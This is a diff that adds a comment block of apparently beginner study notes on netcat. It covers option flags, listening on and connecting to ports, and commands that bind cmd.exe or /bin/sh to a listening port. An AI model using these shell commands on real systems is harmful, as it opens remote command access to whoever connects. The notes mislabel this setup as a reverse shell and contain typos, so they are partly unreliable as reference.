@@ -1,0 +1,46 @@
+/** Intro to NetCat
+ 
+    Netcat performs a variety of reverse shell and port listening tasks in networking.
+
+    NetCat Commands/Options:
+
+        nc: Netcat command
+        -help: Provides available options for netcat
+        -v: verbose
+        -l: listen
+        -p: port
+        -n: numeric only IP addresses, no DNS
+        -e: executes a program on the target
+
+    How to listen on a port:
+
+        This command basically allows a machine to act as a server side, listening for 
+        any and all connections from client 
+
+        nc -vlp PORTNNUMBER
+
+        OR: 
+
+            nc -p 1200 -l -v 
+
+    How to connect to a target:
+
+        nc --v 192.168.0.111 PORTNUMBER
+
+        After entering the following command, if connected successfully to a listening port, 
+        allows us to type anything and send data to the target
+   
+    How to create a reverse shell:
+
+        On the listening port/system, enter
+
+            WINDOWS SYSTEM:
+            nc -vlp PORTNNUMBER -e cmd.exe 
+                On port 1200 of a machine, run the cmd prop program as soon as client connects, 
+                enabling a reverse shell. Once the client connects to the port, a reverse shell 
+                will be available to them to execute shell commands.
+
+            LINUX SYSTEM:
+            ncat -e /bin/sh -vlp PORTNNUMBER
+
+**/
